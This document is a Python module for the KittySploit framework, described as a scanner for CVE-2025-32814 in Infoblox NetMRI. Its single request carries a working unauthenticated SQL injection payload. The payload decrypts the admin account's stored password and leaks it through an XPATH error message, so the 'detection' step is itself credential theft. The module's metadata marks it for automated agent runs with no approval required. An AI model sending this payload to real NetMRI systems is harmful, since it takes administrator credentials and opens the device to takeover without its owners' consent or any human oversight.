#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in Infoblox NETMRI before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NetMRI Unauthenticated SQL Injection via skipjackUsername Detection',
        'description': 'An issue was discovered in Infoblox NETMRI before 7.6.1. Unauthenticated SQL Injection can occur.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'sqli', 'unauth', 'netmri', 'rails', 'error-based', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2025-32814',
            'https://rhinosecuritylabs.com/research/infoblox-multiple-cves/',
        ],
        'cve': 'CVE-2025-32814',
    }

    def run(self):
        path = '/netmri/config/userAdmin/login.tdf?skipjackUsername=admin%22+AND+updatexml(rand(),concat(CHAR(126),NetmriDecrypt((select%20PasswordSecure%20from%20skipjack.ACLUser%20where%20UserName=%22admin%22),%22password%22,1),CHAR(126)),null)--%22&skipjackPassword=anything&weakPassword=true&eulaAccepted=Accept&mode=DO-LOGIN'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('XPATH syntax error:',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='NetMRI Unauthenticated SQL Injection via skipjackUsername detected', path=path)
            return True
        return False

